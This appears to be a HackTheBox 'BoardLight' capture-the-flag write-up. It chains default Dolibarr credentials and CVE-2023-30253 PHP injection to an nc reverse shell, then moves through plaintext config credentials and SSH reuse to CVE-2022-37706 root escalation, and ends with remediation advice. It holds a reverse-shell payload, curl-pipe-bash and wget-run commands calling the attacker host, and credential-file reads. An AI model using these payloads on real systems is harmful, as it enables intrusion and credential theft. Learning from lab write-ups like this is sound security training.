---
layout: post
title: "BoardLight - HackTheBox WriteUp"
date: 2024-04-15
categories: [CTF, HackTheBox, WriteUp]
tags: [WebApp, CMS, Dolibarr, CVE-2023-30253, PrivEsc, SUID, CVE-2022-37706, Linux]
difficulty: Easy
platform: HackTheBox
author: Aubin SABY
lang: en
permalink: /en/blog/2024/04/15/boardlight-htb-writeup/
excerpt: "Linux machine exposing a vulnerable Dolibarr 17.0.0 instance. CVE-2023-30253 exploitation for RCE, then privilege escalation via SUID Enlightenment (CVE-2022-37706)."
---

<div class="bg-gradient-to-r from-green-500/10 to-cyan-500/10 p-8 rounded-xl mb-12 border-l-4 border-green-500 shadow-lg">
    <div class="flex flex-col md:flex-row items-start md:items-center justify-between mb-6 gap-4">
        <div class="flex-1">
            <h2 class="text-4xl md:text-5xl font-bold text-green-500 mb-3">
                <i class="fas fa-cube mr-3"></i>BoardLight
            </h2>
            <p class="text-gray-700 dark:text-gray-300 text-lg md:text-xl">
                Dolibarr 17.0.0 Exploitation + SUID Privilege Escalation
            </p>
        </div>
        <div class="flex gap-3">
            <span class="px-5 py-2 bg-green-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fas fa-circle text-xs mr-1"></i>Easy
            </span>
            <span class="px-5 py-2 bg-blue-500 text-white rounded-lg text-sm font-semibold shadow-md">
                <i class="fab fa-linux mr-1"></i>Linux
            </span>
        </div>
    </div>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm bg-white/60 dark:bg-gray-800/60 p-5 rounded-lg backdrop-blur-sm">
        <div class="flex items-center gap-2">
            <i class="fas fa-calendar text-green-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Date</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">04/15/2024</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-network-wired text-blue-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Target IP</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">10.10.11.11</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-shield-alt text-purple-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">OS</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">Ubuntu 20.04</div>
            </div>
        </div>
        <div class="flex items-center gap-2">
            <i class="fas fa-star text-amber-500"></i>
            <div>
                <div class="text-xs text-gray-500 dark:text-gray-400">Points</div>
                <div class="font-semibold text-gray-800 dark:text-gray-200">20</div>
            </div>
        </div>
    </div>
</div>

## 🎯 Synopsis

**BoardLight** is an <span class="text-highlight-green">**easy Linux machine**</span> exposing a <span class="text-highlight-red">**Dolibarr 17.0.0**</span> instance vulnerable to <span class="text-highlight-orange">**CVE-2023-30253**</span>.

Exploiting this vulnerability allows obtaining <span class="text-highlight-blue">**initial access**</span> as the web user `www-data`. System enumeration reveals <span class="text-highlight-red">**plaintext credentials**</span> in the Dolibarr configuration file, allowing SSH connection with the `larissa` user. Finally, privilege escalation is achieved via exploiting the <span class="text-highlight-purple">**SUID Enlightenment**</span> binary affected by <span class="text-highlight-orange">**CVE-2022-37706**</span>, leading to a <span class="text-highlight-green">**root shell**</span>.

<div class="grid md:grid-cols-2 gap-6 my-10">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-portfolio-violet">
        <h3 class="text-2xl font-bold text-portfolio-violet mb-4">
            <i class="fas fa-brain mr-2"></i>Required Skills
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Basic Linux commands</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Web enumeration and virtual hosts</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>Linux permissions analysis</li>
            <li><i class="fas fa-check-circle text-green-500 mr-2"></i>PHP source code reading</li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-cyan-500">
        <h3 class="text-2xl font-bold text-cyan-500 mb-4">
            <i class="fas fa-rocket mr-2"></i>Skills Acquired
        </h3>
        <ul class="space-y-2 text-gray-700 dark:text-gray-300">
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Dolibarr exploitation (CVE-2023-30253)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>SUID privilege escalation (CVE-2022-37706)</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Subdomain fuzzing with ffuf</li>
            <li><i class="fas fa-star text-amber-500 mr-2"></i>Automated enumeration with LinPEAS</li>
        </ul>
    </div>
</div>


## 🔍 Phase 1 — Network Reconnaissance

### Initial Port Scan

We start with a quick scan of all TCP ports to identify exposed services:

```bash
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11
```

### Detailed Service Enumeration

Once open ports are identified, we perform a detailed scan with version detection and NSE scripts:

```bash
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.11
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-search mr-2"></i>Scan Results
    </h4>
    <div class="space-y-3">
        <div class="flex items-start gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl text-blue-500">
                <i class="fas fa-network-wired"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-blue-600 dark:text-blue-400">Port 22/TCP - SSH</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">OpenSSH 8.2p1 Ubuntu 4ubuntu0.11</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Secure remote administration service</div>
            </div>
        </div>
        <div class="flex items-start gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl text-green-500">
                <i class="fas fa-globe"></i>
            </div>
            <div class="flex-1">
                <div class="font-bold text-lg text-green-600 dark:text-green-400">Port 80/TCP - HTTP</div>
                <div class="text-gray-600 dark:text-gray-400 text-sm mt-1">Apache httpd 2.4.41 ((Ubuntu))</div>
                <div class="text-xs text-gray-500 dark:text-gray-500 mt-2">Web server hosting the target application</div>
            </div>
        </div>
    </div>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Entry Point Identified:</strong> The web service on port 80 is the most likely initial attack vector.
    </p>
</div>


## 🌐 Phase 2 — Web Enumeration and Virtual Hosts

### Main Domain Discovery

Visiting `http://10.10.11.11`, the site displays `board.htb` in the footer

. We add it to `/etc/hosts`:

```bash
echo "10.10.11.11 board.htb" | sudo tee -a /etc/hosts
```

### Subdomain Fuzzing

Header `Host` fuzzing allows discovering additional virtual hosts hosted on the same server:

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://board.htb/ \
     -H 'Host: FUZZ.board.htb' \
     -fs 15949
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Subdomain Discovered:</strong> <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded font-mono">crm.board.htb</code>
    </p>
</div>

We add this new subdomain to `/etc/hosts`:

```bash
echo "10.10.11.11 crm.board.htb" | sudo tee -a /etc/hosts
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Key Technique:</strong> Header <code>Host</code> fuzzing is an essential enumeration method to discover virtual hosts not listed in public DNS records.
    </p>
</div>

## 💼 Phase 3 — Initial Access via Dolibarr

### Application Identification

Accessing `http://crm.board.htb/`, we discover a **Dolibarr ERP/CRM** authentication interface.

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <div class="flex items-center gap-4 mb-4">
        <div class="text-4xl text-blue-500">
            <i class="fas fa-building"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-xl font-bold text-gray-800 dark:text-gray-200">Dolibarr ERP/CRM</h4>
            <p class="text-gray-600 dark:text-gray-400">Version 17.0.0</p>
        </div>
    </div>
    <p class="text-gray-700 dark:text-gray-300">
        Dolibarr is an open-source ERP/CRM software widely used by SMEs.
    </p>
</div>

### Default Authentication

Attempting login with default credentials:

```bash
Username: admin
Password: admin
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-unlock mr-2 text-green-500"></i>
        <strong>Authentication Successful\!</strong> Default credentials were never changed.
    </p>
</div>

<div class="bg-amber-100 dark:bg-amber-900/20 border-l-4 border-amber-500 p-4 my-4 rounded-r-lg">
    <p class="text-amber-800 dark:text-amber-200">
        <i class="fas fa-exclamation-triangle mr-2 text-amber-500"></i>
        <strong>Bad Practice:</strong> Maintaining default credentials is a critical and easily exploitable vulnerability.
    </p>
</div>

## ⚙️ Phase 4 — Exploitation CVE-2023-30253

### Vulnerability Analysis

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2023-30253 - PHP Code Injection
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Affected Versions:</span> Dolibarr &lt; 17.0.1
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type:</span> Remote Code Execution (RCE)
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score:</span> 9.8 (Critical)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description:</span><br>
            In Dolibarr versions &lt; 17.0.1, the server-side filter only handles the lowercase <code>&lt;?php</code> tag. An authenticated user can bypass this protection by using <code>&lt;?PHP</code> (uppercase) to inject and execute PHP code on the server.
        </div>
    </div>
</div>

### Proof of Concept

1. **Navigation:** Website → Create New Website
2. **Create a web page** in the Dolibarr editor
3. **Edit HTML source** of the page
4. **Inject PHP payload:**

```php
<?PHP echo system("whoami"); ?>
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Result:</strong> Code executes with <code class="bg-green-200 dark:bg-green-800 px-2 py-1 rounded">www-data</code> user privileges
    </p>
</div>

### Obtaining a Reverse Shell

**Configuring the listener on the attacking machine:**

```bash
nc -lnvp 4455
```

**Injecting the reverse shell payload in the Dolibarr editor:**

```php
<?PHP echo system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.41 4455 >/tmp/f"); ?>
```

**Triggering the payload:** Access the created page via the browser

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-terminal mr-2 text-green-500"></i>
        Shell obtained as www-data\!
    </p>
</div>

## 🔧 Phase 5 — Shell Stabilization and Enumeration

### Shell Improvement

Stabilizing the shell for better interactivity:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 38 columns 160
```

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-info-circle mr-2 text-cyan-500"></i>
        <strong>Tip:</strong> This technique provides a complete interactive shell with command history and auto-completion.
    </p>
</div>

### Configuration File Enumeration

Web applications often store credentials in their configuration files. We examine the Dolibarr configuration file:

```bash
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php
```

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4 border-l-4 border-green-500">
    <h4 class="text-xl font-bold mb-4 text-green-600 dark:text-green-400 flex items-center">
        <i class="fas fa-key mr-2"></i>Discovered Credentials
    </h4>
    <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm">
        <div class="text-gray-700 dark:text-gray-300">
            <span class="text-blue-600 dark:text-blue-400">$dolibarr_main_db_user</span>=<span class="text-green-600 dark:text-green-400">'dolibarrowner'</span>;<br>
            <span class="text-blue-600 dark:text-blue-400">$dolibarr_main_db_pass</span>=<span class="text-green-600 dark:text-green-400">'serverfun2$2023\!\!'</span>;
        </div>
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        <strong>Plaintext Credentials Found\!</strong> These credentials are potentially reused elsewhere on the system.
    </p>
</div>

<div class="bg-cyan-100 dark:bg-cyan-900/20 border-l-4 border-cyan-500 p-4 my-4 rounded-r-lg">
    <p class="text-cyan-800 dark:text-cyan-200">
        <i class="fas fa-lightbulb mr-2 text-cyan-500"></i>
        <strong>Technique:</strong> Web application configuration files are goldmines for pivoting — they often contain valid credentials reused on the system.
    </p>
</div>

## 🔐 Phase 6 — SSH Access and User Flag

### System User Identification

Checking existing users:

```bash
cat /etc/passwd | grep -E '/bin/(bash|sh)' | grep -v root
```

**Result:** The user `larissa` has shell access.

### SSH Connection

Attempting SSH connection with the discovered password:

```bash
ssh larissa@board.htb
```

**Password:** `serverfun2$2023\!\!`

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-lg">
        <i class="fas fa-check-circle mr-2 text-green-500"></i>
        SSH Connection Successful\!
    </p>
</div>

### Access Validation

```bash
id
whoami
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)
    </div>
</div>

### User Flag Retrieval

```bash
cat ~/user.txt
```

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200">
        <i class="fas fa-flag mr-2 text-green-500"></i>
        <strong>User Flag Obtained\!</strong> First step completed.
    </p>
</div>

## 🔍 Phase 7 — Local Enumeration with LinPEAS

### LinPEAS Deployment

Hosting the script on the attacking machine:

```bash
python3 -m http.server 3000
```

Downloading and executing on the target:

```bash
curl http://10.10.14.41:3000/linpeas.sh | bash
```

### Results Analysis

LinPEAS identifies several interesting SUID binaries:

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-xl font-bold mb-4 text-red-600 dark:text-red-400 flex items-center">
        <i class="fas fa-exclamation-triangle mr-2"></i>Suspicious SUID Binaries Detected
    </h4>
    <div class="bg-gray-100 dark:bg-gray-800 p-4 rounded font-mono text-sm space-y-2">
        <div class="text-red-600 dark:text-red-400">
            -rwsr-xr-x 1 root root 27K /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
        </div>
        <div class="text-amber-600 dark:text-amber-400">
            -rwsr-xr-x 1 root root 15K /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
        </div>
    </div>
</div>

<div class="bg-red-100 dark:bg-red-900/20 border-l-4 border-red-500 p-4 my-4 rounded-r-lg">
    <p class="text-red-800 dark:text-red-200">
        <i class="fas fa-search mr-2 text-red-500"></i>
        <strong>Escalation Vector Identified:</strong> The <code class="bg-red-200 dark:bg-red-800 px-2 py-1 rounded">enlightenment_sys</code> binary has three suspicious characteristics:
    </p>
    <ul class="mt-3 ml-6 space-y-1 text-red-700 dark:text-red-300">
        <li><strong>SUID bit enabled</strong> → executes with root privileges</li>
        <li><strong>Non-standard binary</strong> → potentially vulnerable</li>
        <li><strong>Unknown version</strong> → requires CVE verification</li>
    </ul>
</div>

## 👑 Phase 8 — Privilege Escalation via CVE-2022-37706

### Vulnerability Analysis

<div class="bg-red-50 dark:bg-red-900/20 p-6 rounded-xl border-l-4 border-red-500 my-4">
    <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-3 flex items-center">
        <i class="fas fa-bug mr-2"></i>CVE-2022-37706 - Enlightenment Path Traversal
    </h4>
    <div class="space-y-2 text-gray-700 dark:text-gray-300">
        <div class="grid md:grid-cols-2 gap-4">
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Affected Versions:</span> Enlightenment &lt; 0.25.4
            </div>
            <div>
                <span class="font-semibold text-red-600 dark:text-red-400">Type:</span> Local Privilege Escalation
            </div>
        </div>
        <div>
            <span class="font-semibold text-red-600 dark:text-red-400">CVSS Score:</span> 7.8 (High)
        </div>
        <div class="mt-4">
            <span class="font-semibold text-red-600 dark:text-red-400">Description:</span><br>
            The <code>enlightenment_sys</code> binary (versions &lt; 0.25.4) improperly handles paths starting with <code>/dev/..</code>, allowing a local attacker to escalate privileges to root.
        </div>
    </div>
</div>

**Technical Details:**

- The binary performs a check `mount_ok` that validates paths
- Paths starting with `/dev/..` bypass this validation
- This allows mounting any file system with root privileges

### Exploitation

Hosting the PoC on the attacking machine:

```bash
python3 -m http.server 2000
```

Downloading and executing the exploit:

```bash
# Download the exploit
wget http://10.10.14.41:2000/exploit.sh

# Make it executable
chmod +x exploit.sh

# Launch exploitation
./exploit.sh
```

### Exploitation Result

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-green-600 dark:text-green-400">
        [+] Vulnerable SUID binary found\!<br>
        [+] Trying to pop a root shell\!<br>
        [+] Enjoy the root shell :)
    </div>
</div>

**Privilege verification:**

```bash
id
whoami
```

<div class="bg-gray-100 dark:bg-gray-800 p-4 rounded-lg my-4 font-mono text-sm">
    <div class="text-gray-700 dark:text-gray-300">
        uid=0(root) gid=0(root) groups=0(root),4(adm),1000(larissa)
    </div>
</div>

<div class="bg-green-100 dark:bg-green-900/20 border-l-4 border-green-500 p-4 my-4 rounded-r-lg">
    <p class="text-green-800 dark:text-green-200 font-bold text-xl">
        <i class="fas fa-crown mr-2 text-amber-500"></i>
        ROOT SHELL OBTAINED\! Maximum privileges achieved.
    </p>
</div>

## 🏁 Phase 9 — Flag Extraction

### Root Flag Retrieval

With root access, we can now retrieve the root flag:

```bash
cat /root/root.txt
```

<div class="bg-gradient-to-r from-amber-500/10 to-yellow-500/10 p-6 rounded-xl border-l-4 border-amber-500 my-4">
    <div class="flex items-center gap-4">
        <div class="text-5xl text-amber-500">
            <i class="fas fa-trophy"></i>
        </div>
        <div class="flex-1">
            <h4 class="text-2xl font-bold text-amber-600 dark:text-amber-400 mb-2">Machine Pwned\!</h4>
            <p class="text-gray-700 dark:text-gray-300">
                <i class="fas fa-flag text-green-500 mr-2"></i><strong>User flag:</strong> /home/larissa/user.txt<br>
                <i class="fas fa-flag text-red-500 mr-2"></i><strong>Root flag:</strong> /root/root.txt
            </p>
        </div>
    </div>
</div>

## 📋 Phase 10 — Recommendations and Remediation

<div class="grid md:grid-cols-2 gap-6 my-8">
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-red-500">
        <h4 class="text-xl font-bold text-red-600 dark:text-red-400 mb-4 flex items-center">
            <i class="fas fa-globe mr-2"></i>Application
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Update Dolibarr to version ≥ 17.0.1</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Secure credentials (encryption, vault)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Change all default credentials</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Implement input validation and sanitization</span>
            </li>
        </ul>
    </div>
    <div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg border-l-4 border-blue-500">
        <h4 class="text-xl font-bold text-blue-600 dark:text-blue-400 mb-4 flex items-center">
            <i class="fas fa-server mr-2"></i>System
        </h4>
        <ul class="space-y-3 text-gray-700 dark:text-gray-300">
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Audit SUID binaries (<code>find / -perm -4000 2>/dev/null</code>)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Update Enlightenment to version ≥ 0.25.4</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Harden SSH (public keys only, disable password auth)</span>
            </li>
            <li class="flex items-start gap-2">
                <i class="fas fa-check text-green-500 mt-1"></i>
                <span>Monitor access logs and suspicious activities</span>
            </li>
        </ul>
    </div>
</div>

---

## 📝 Command Summary

```bash
# Network reconnaissance
nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11
ports=$(nmap -Pn -p- --min-rate=1000 -T4 10.10.11.11 | grep '^[0-9]' | cut -d'/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -Pn -sC -sV 10.10.11.11

# Virtual host fuzzing
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ \
     -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949

# Shell stabilization
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
stty rows 38 columns 160

# Configuration file enumeration
cat /var/www/html/crm.board.htb/htdocs/conf/conf.php

# SSH connection
ssh larissa@board.htb

# LinPEAS
curl http://10.10.14.41:3000/linpeas.sh | bash

# Exploitation CVE-2022-37706
wget http://10.10.14.41:2000/exploit.sh
chmod +x exploit.sh
./exploit.sh
```

---

## 🔗 Attack Chain Summary

<div class="bg-white dark:bg-dark-navbar p-8 rounded-xl shadow-lg my-8">
    <h3 class="text-2xl font-bold text-portfolio-violet mb-6 flex items-center">
        <i class="fas fa-project-diagram mr-3"></i>Complete Attack Path
    </h3>
    <div class="space-y-4">
        <div class="flex items-center gap-4 p-4 bg-blue-50 dark:bg-blue-900/20 rounded-lg border-l-4 border-blue-500">
            <div class="text-3xl font-bold text-blue-500">1</div>
            <div class="flex-1">
                <div class="font-bold text-blue-600 dark:text-blue-400">Reconnaissance and Enumeration</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Nmap → board.htb → ffuf → crm.board.htb</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-green-50 dark:bg-green-900/20 rounded-lg border-l-4 border-green-500">
            <div class="text-3xl font-bold text-green-500">2</div>
            <div class="flex-1">
                <div class="font-bold text-green-600 dark:text-green-400">Exploitation and Initial Access</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">Default creds (admin:admin) → CVE-2023-30253 → www-data shell</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-purple-50 dark:bg-purple-900/20 rounded-lg border-l-4 border-purple-500">
            <div class="text-3xl font-bold text-purple-500">3</div>
            <div class="flex-1">
                <div class="font-bold text-purple-600 dark:text-purple-400">Enumeration and Pivoting</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">conf.php → plaintext creds → SSH larissa</div>
            </div>
        </div>
        <div class="flex items-center gap-4 p-4 bg-red-50 dark:bg-red-900/20 rounded-lg border-l-4 border-red-500">
            <div class="text-3xl font-bold text-red-500">4</div>
            <div class="flex-1">
                <div class="font-bold text-red-600 dark:text-red-400">Privilege Escalation</div>
                <div class="text-sm text-gray-600 dark:text-gray-400">CVE-2022-37706 → SUID Enlightenment → Root shell</div>
            </div>
        </div>
    </div>
</div>

---

## 🏷️ Tags & References

<div class="flex flex-wrap gap-2 my-4" style="line-height: 1.5;">
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(59, 130, 246, 0.1); color: #3b82f6; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">WebApp</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(34, 197, 94, 0.1); color: #22c55e; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CMS</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(168, 85, 247, 0.1); color: #a855f7; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Dolibarr</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(239, 68, 68, 0.1); color: #ef4444; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2023-30253</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(245, 158, 11, 0.1); color: #f59e0b; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">PrivEsc</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(99, 102, 241, 0.1); color: #6366f1; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">SUID</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(236, 72, 153, 0.1); color: #ec4899; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">CVE-2022-37706</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(107, 114, 128, 0.1); color: #6b7280; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">Linux</span>
    <span style="display: inline-block; padding: 0.25rem 0.5rem; background-color: rgba(6, 182, 212, 0.1); color: #06b6d4; border-radius: 0.25rem; font-size: 0.75rem; font-weight: 600;">HackTheBox</span>
</div>

<div class="bg-white dark:bg-dark-navbar p-6 rounded-xl shadow-lg my-4">
    <h4 class="text-lg font-bold mb-4 text-portfolio-violet flex items-center">
        <i class="fas fa-link mr-2"></i>Useful References
    </h4>
    <ul class="space-y-2 text-gray-700 dark:text-gray-300">
        <li>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2023-30253" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2023-30253 - Dolibarr PHP Code Injection
            </a>
        </li>
        <li>
            <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-37706" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                CVE-2022-37706 - Enlightenment Privilege Escalation
            </a>
        </li>
        <li>
            <a href="https://github.com/peass-ng/PEASS-ng" target="_blank" class="text-blue-600 dark:text-blue-400 hover:underline flex items-center gap-2">
                <i class="fas fa-external-link-alt text-xs"></i>
                LinPEAS - Privilege Escalation Awesome Scripts
            </a>
        </li>
    </ul>
</div>

---

<div class="text-center my-12">
    <a href="{{ site.baseurl }}/en/blog/" class="inline-block bg-gradient-to-r from-portfolio-violet to-cyan-500 hover:from-portfolio-violet-light hover:to-cyan-600 text-white font-bold py-4 px-10 rounded-lg shadow-lg transition duration-300 transform hover:scale-105">
        <i class="fas fa-arrow-left mr-2"></i>Back to blog
    </a>
</div>
